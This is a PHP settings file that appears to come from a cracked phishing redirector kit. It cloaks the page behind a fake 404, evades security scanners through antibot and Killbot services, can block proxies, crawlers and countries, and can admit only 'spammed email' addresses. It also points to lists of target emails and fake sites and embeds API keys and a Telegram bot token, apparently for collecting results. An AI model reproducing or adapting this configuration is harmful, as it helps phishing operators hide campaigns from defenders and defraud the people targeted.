<?php
error_reporting(0);
session_start();

if (!isset($_SESSION['redi_watch'])) {
header("HTTP/1.0 404 Not Found");
exit("<h1>Not Found</h1>
The requested URL " . $_SERVER["REQUEST_URI"] . " was not found on this server.
<hr>");
}

$activated = 'Cracked'; // None Use Of It Anymore hehe
$visitcount = 2;  // How many time you want to allow access to redirector

$antibotpw_api = 'ecfbaa43bf34bec5c07462eb486f8';   //antibot.pw api key here 




// as possible as you can  , avoid activating all switchs


//free ip_protection Limit 1000 request 

$proxy_block = false;   //block proxy ip or vpn 
$activate_proxy_risk = false;
$proxy_risk = 70;  // allow proxy if below risk value 
$fuck1 = ('id');  // please change this to match script.txt fuck 1
$fuck2 = ('products');  // please change this to match script.txt fuck2


// please turn of ip_protection to use this for best performamce 

$kill_bot_active = false; //activate Killbot.org,    make sure to add your api 
$kill_bot_api = 'unktrutNkXpag9CKlqhqNbM0NCkRJVebB5kibp9415';   // if you plan to use https://killbot.org/
$emailaccess_only = false;  // change to true to allow only spammed email access  format  ?data=email@email.com
$crawler_bot = true; // prevent crawing bot access 
$country_lock = false;  //lock your page to a country 
$country_code = ["FR", "UK", "US", "GO"];  // enter short code of country here and lock your page to it   // view code list http://www.analysespider.com/ip2country/country_code.html


$url_file = 'urls.txt';
$email_list = 'email/lists.txt';
$errorpage = 'errorpage/error.php';  // Change this to error2 to switch to cloudflare error 
$failed_url = true; //Change this to false to activate fakes sites 
$telegram_bot_token = '1413261703:AAEcKf50z953W7duG0tISO-5NK4cPmdT_ZI';
$telegram_user_id = 151588551;



?>
